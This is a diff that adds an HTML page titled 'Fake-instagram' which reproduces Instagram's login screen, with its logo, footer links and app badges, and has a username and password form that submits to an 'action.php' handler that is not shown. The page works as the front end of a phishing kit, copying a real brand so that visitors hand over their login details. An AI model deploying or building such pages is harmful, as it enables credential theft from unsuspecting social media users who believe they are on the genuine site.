@@ -1,0 +1,176 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login • Fake-instagram</title>
+    <link rel="icon"
+        href="https://play-lh.googleusercontent.com/c2DcVsBUhJb3UlAGABHwafpuhstHwORpVwWZ0RvWY7NPrgdtT2o4JRhcyO49ehhUNRca=w480-h960"
+        type="image/x-icon">
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="stylecmn.css">
+</head>
+<body>
+<div class="bodybss">
+    <div class="container flex">
+        <div class="subcntnr">
+            <div class="border css">
+                <div class="log">
+                    <img src="https://www.instagram.com/static/images/web/logged_out_wordmark-2x.png/d2529dbef8ed.png" class="instagram-logo" alt="instagram">
+                </div>
+                <form action="action.php">
+                    <div class="ft flex "><input type="text" name="username" id="text"
+                            placeholder=" Phone number, username or email address"></div>
+
+                    <div class="ft flex "><input type="password" name="password" id="text" placeholder=" Password">
+                    </div>
+                    <div class="ft flex "><button type="submit"> Log in </button></div>
+                </form>
+                <div class="ft flex">
+                    <div class=" hrbss">
+                        <hr class="hr hr1">OR
+                        <hr class="hr hr2">
+                    </div>
+                </div>
+                <div class="lwfbdiv">
+                    <button class="lgin-wfb">
+                        <span class="fblgo"><img class="fblgom"
+                                src="data:image/jpeg;base64,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"
+                                alt="facebook"></span>
+                        <a class="fblgn" href="https://www.facebook.com/">Log in with Facebook</a>
+                    </button>
+                    <br>
+                </div>
+                <div class="fpsrd flex">
+                    <a class="fpsrda" href="https://www.instagram.com/accounts/password/reset/">Forgot password?</a>
+                </div>
+            </div>
+            <div class="border dha">
+                <div class="dhasu flex">
+                    Don't have an account?
+                    <a class="decor sign-up" href="https://www.instagram.com/accounts/emailsignup/">Sign up</a>
+                </div>
+            </div>
+            <div class="getapps">
+                <p class="tcenter gta">Get the app.</p>
+                <div class="gacnr">
+                    <div class="flex">
+                        <span><a href="https://apps.apple.com/app/instagram/id389801252?vt=lo"><img
+                                    class="img-dwnld iosapp"
+                                    src="https://www.instagram.com/static/images/appstore-install-badges/badge_ios_english-en.png/180ae7a0bcf7.png"
+                                    alt="download-on-appstore"></a></span>
+                        <span><a
+                                href="https://play.google.com/store/apps/details?id=com.instagram.android&referrer=utm_source%3Dinstagramweb%26utm_campaign%3DloginPage%26ig_mid%3D3D410255-DAA6-4CAE-8507-DC2DE84E9F90%26utm_content%3Dlo%26utm_medium%3Dbadge"><img
+                                    class="img-dwnld android-app"
+                                    src="https://www.instagram.com/static/images/appstore-install-badges/badge_android_english-en.png/e9cd846dc748.png"
+                                    alt="download-on-playstore"></a></span>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <div class="linksh">
+        <div class="links">
+            <div class="links-top flex">
+                <div class="meta links-cmn"> <a class="decor links-cmna" href="https://about.facebook.com/meta">Meta</a>
+                </div>
+                <div class="About links-cmn"> <a class="decor links-cmna" href="https://about.instagram.com/">About</a>
+                </div>
+                <div class="Blog links-cmn"> <a class="decor links-cmna"
+                        href="https://about.instagram.com/blog/">Blog</a>
+                </div>
+                <div class="jobs links-cmn"> <a class="decor links-cmna"
+                        href="https://www.instagram.com/about/jobs/">jobs
+                    </a></div>
+                <div class="Help links-cmn"> <a class="decor links-cmna" href="https://help.instagram.com/">Help </a>
+                </div>
+                <div class="API links-cmn"> <a class="decor links-cmna"
+                        href="https://developers.facebook.com/docs/instagram">API </a></div>
+                <div class="Privacy links-cmn"> <a class="decor links-cmna"
+                        href="https://www.instagram.com/legal/privacy/">Privacy </a></div>
+                <div class="Terms links-cmn"> <a class="decor links-cmna"
+                        href="https://www.instagram.com/legal/terms/">Terms </a></div>
+                <div class="TopAccounts links-cmn"> <a class="decor links-cmna"
+                        href="https://www.instagram.com/directory/profiles/">Top Accounts </a></div>
+                <div class=" Hashtags links-cmn"> <a class="decor links-cmna"
+                        href="https://www.instagram.com/directory/hashtags/"> Hashtags </a></div>
+                <div class="Locations links-cmn"> <a class="decor links-cmna"
+                        href="https://www.instagram.com/explore/locations/">Locations </a></div>
+                <div class="Instagram-Lite links-cmn"><a class="decor links-cmna"
+                        href="https://www.instagram.com/web/lite/">Instagram Lite </a></div>
+                <div class="Non-users links-cmn"> <a class="decor links-cmna"
+                        href="https://www.facebook.com/help/instagram/261704639352628">Contacts uploading & Non-Users
+                    </a>
+                </div>
+            </div>
+            <br>
+            <div class="links-bottom flex">
+
+                <div class="slector-lbl">
+                    <span>English</span>
+                    <select title="none" type="select" name="language" class="selector">
+                        <option> </option>
+                        <option value="en">English</option>
+                        <option value="af">Afrikaans</option>
+                        <option value="cs">Čeština</option>
+                        <option value="da">Dansk</option>
+                        <option value="de">Deutsch</option>
+                        <option value="el">Ελληνικά</option>
+                        <option value="en-gb">English (UK)</option>
+                        <option value="es">Español (España)</option>
+                        <option value="es-la">Español</option>
+                        <option value="fi">Suomi</option>
+                        <option value="fr">Français</option>
+                        <option value="id">Bahasa Indonesia</option>
+                        <option value="it">Italiano</option>
+                        <option value="ja">日本語</option>
+                        <option value="ko">한국어</option>
+                        <option value="ms">Bahasa Melayu</option>
+                        <option value="nb">Norsk</option>
+                        <option value="nl">Nederlands</option>
+                        <option value="pl">Polski</option>
+                        <option value="pt-br">Português (Brasil)</option>
+                        <option value="pt">Português (Portugal)</option>
+                        <option value="ru">Русский</option>
+                        <option value="sv">Svenska</option>
+                        <option value="th">ภาษาไทย</option>
+                        <option value="tl">Filipino</option>
+                        <option value="tr">Türkçe</option>
+                        <option value="zh-cn">中文(简体)</option>
+                        <option value="zh-tw">中文(台灣)</option>
+                        <option value="zh-tw">中文(台灣)</option>
+                        <option value="gu">ગુજરાતી</option>
+                        <option value="hi">हिन्दी</option>
+                        <option value="hr">Hrvatski</option>
+                        <option value="hu">Magyar</option>
+                        <option value="hu">Magyar</option>
+                        <option value="kn">ಕನ್ನಡ</option>
+                        <option value="ml">മലയാളം</option>
+                        <option value="mr">मराठी</option>
+                        <option value="ne">नेपाली</option>
+                        <option value="pa">ਪੰਜਾਬੀ</option>
+                        <option value="si">සිංහල</option>
+                        <option value="sk">Slovenčina</option>
+                        <option value="ta">தமிழ்</option>
+                        <option value="te">తెలుగు</option>
+                        <option value="vi">Tiếng Việt</option>
+                        <option value="zh-hk">中文(香港)</option>
+                        <option value="bg">Български</option>
+                        <option value="fr-ca">Français (Canada)</option>
+                        <option value="ro">Română</option>
+                        <option value="sr">Српски</option>
+                        <option value="uk">Українська</option>
+                    </select>
+                </div>
+                <p>&copy; 2022 Instagram from Meta</p>
+
+            </div>
+        </div>
+    </div>
+</div>
+
+
+</body>
+
+</html>
